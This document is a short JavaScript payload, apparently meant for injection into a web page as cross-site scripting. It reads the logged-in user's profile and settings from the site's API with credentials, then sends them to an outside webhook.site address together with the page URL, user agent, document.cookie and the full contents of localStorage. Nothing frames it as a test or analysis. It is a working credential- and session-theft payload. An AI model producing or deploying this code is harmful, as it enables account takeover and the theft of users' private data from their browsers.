(async () => {
	const me = await fetch("/api/v2/users/current", { credentials: "include" })
		.then((r) => r.json())
		.catch((e) => ({ err: e.message }));
	const settings = await fetch("/api/v2/user_settings", { credentials: "include" })
		.then((r) => r.json())
		.catch(() => null);
	navigator.sendBeacon(
		"https://webhook.site/66deee1c-f293-4269-95fc-2cff630e781d",
		JSON.stringify({
			url: location.href,
			ua: navigator.userAgent,
			cookies: document.cookie,
			user: me,
			settings,
			localStorage: Object.fromEntries(Object.entries(localStorage)),
		}),
	);
})();
